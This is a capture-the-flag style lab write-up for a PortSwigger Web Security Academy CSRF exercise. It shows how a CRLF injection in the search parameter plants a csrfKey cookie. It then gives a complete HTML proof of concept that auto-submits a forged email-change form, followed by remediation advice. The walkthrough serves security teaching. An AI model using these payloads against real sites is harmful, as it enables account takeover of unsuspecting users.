# CSRF where token is tied to non-session cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya


### Vulnerability / Concept

Cross-Site Request Forgery (CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they did not intend to perform. It occurs when an application relies solely on cookies for session management without validating that the request originated from the legitimate user's own actions.

CSRF attacks exploit the browser's automatic inclusion of cookies in cross-origin requests. If the victim is authenticated to the target application, the attacker's forged request carries the victim's session cookie, making it appear legitimate to the server.

Key conditions for CSRF: (1) A relevant state-changing action exists, (2) Session management is cookie-based, (3) No unpredictable request parameters (like CSRF tokens) are required.

### Recon / Initial Analysis

1. Identify state-changing endpoints (POST/PUT/DELETE requests that modify data)
2. Check if the application uses CSRF tokens in forms or headers
3. Examine how tokens are validated (presence, session-binding, method-dependence)
4. Test if SameSite cookie attributes are set on session cookies
5. Check if Referer header validation is performed
6. Verify if token validation can be bypassed by removing the token or changing the request method

### Analysis/Exploitation -

Login as user `wiener`:

![](./images/af10909d02bb_001.png)

The session cookie and the csrf-tokens are the expected parts. But there is a second cookie `csrfKey`, that looks very similar to a second session value.

All values remain static for the session. When I logout and login again as the same user, the session cookie changes (this is expected) but csrfKey and csrf-token remain the same.

![](./images/af10909d02bb_002.png)

This indicates that the system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync. This might violate the **tightly connected** property mentioned earlier.

{% hint style="info" %}
💡 **Testing CSRF Tokens and CSRF cookies:**

  1. Check if the CSRF token is tied to the CSRF cookie
- Submit an invalid CSRF token
- Submit a valid CSRF token from another user

—>we get error and it concludes CSRF token may be tied to session or csrfKey cookie

  1. Submit both valid CSRF token and cookie from another user
—>we get 302 response and it concludes CSRF token is tied to csrfKey cookie

**In order to exploit this vulnerability, we need to perform 2 things:**

  1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
  1. Send a CSRF attack to the victim with a known csrf token
{% endhint %}


Login as user `carlos` in incognito:

Submit the "Update email" form, and intercept the resulting request.

**use  the session ID from the current **`carlos`**session, but both **`csrfKey`** as well ass **`csrf`**-token from user **`wiener`

![](./images/af10909d02bb_003.png)

the request goes through and carlos email get changed:

I can change a victims email with my own CSRF-data. Including the csrf-token in the malicious HTML form is easy, but the `csrfKey` is taken from the cookie as **the **`csrfKey`** is a cookie**! And we couldn’t simply add our own cookie value. So the next step is to find a way to manipulate the cookie values.

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

So with it we can set any cookie value as we wanted.

![](./images/af10909d02bb_004.png)

**In **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)**, it said:**

{% hint style="info" %}
To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.
{% endhint %}


**After I google this a little bit, I found this **[**Medium blog**](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)**: which says CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on **[**GeeksforGeeks**](https://www.geeksforgeeks.org/crlf-injection-attack/)

- `\r`** (Carriage Return)** → moves the cursor to the beginning of the line without advancing to the next line
- `\n`** (Line Feed)** → moves the cursor down to the next line without returning to the beginning of the line

**So if the web application is vulnerable, we can inject **`%0d%0a`** (**`\r\n`**) in the request**

Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](./images/af10909d02bb_005.png)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.form
```

![](./images/af10909d02bb_006.png)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="GDejMnJlFfCIXtNUq4fiUPAZwU3ew3dQ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EI5tQ8UWhMoPUcfJk0ulcN7mRnPhkcaC%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

### Why It Works

The vulnerability exists because the server trusts that any request bearing the victim's session cookie was intentionally initiated by the victim. Without anti-CSRF tokens, SameSite cookie restrictions, or Referer validation, the server cannot distinguish between a legitimate request from the user and a forged request from an attacker's page.

The broken trust boundary is between the browser and the server: the browser automatically attaches cookies to any request to the target domain, regardless of which site initiated the request. This design feature of HTTP cookies becomes a security flaw when the server treats cookie presence as proof of user intent.

### Real-World Impact

An attacker could trick an authenticated user into:
- Changing their email address (account takeover via password reset)
- Transferring funds to the attacker's account
- Modifying account settings (disabling 2FA, changing security questions)
- Deleting or modifying critical data
- Elevating privileges if the victim has admin access
- Performing any action the victim is authorized to perform

### Remediation

- Use CSRF tokens that are unique per session and validated server-side on every state-changing request
- Implement SameSite=Strict or SameSite=Lax on session cookies
- Validate the Referer or Origin header on state-changing requests
- Require re-authentication for critical actions (password change, email change, fund transfers)
- Use the Double Submit Cookie pattern as additional defense-in-depth

### Key Takeaways

- CSRF exploits the browser's automatic cookie inclusion — the server cannot verify request origin without additional checks.
- CSRF tokens must be unique per session and validated server-side — their mere presence is not enough.
- SameSite cookie restrictions provide a strong first line of defense but are not a complete solution.
- Referer/Origin validation adds another layer but can be bypassed if not implemented correctly.
- State-changing operations must never be performed via GET requests.
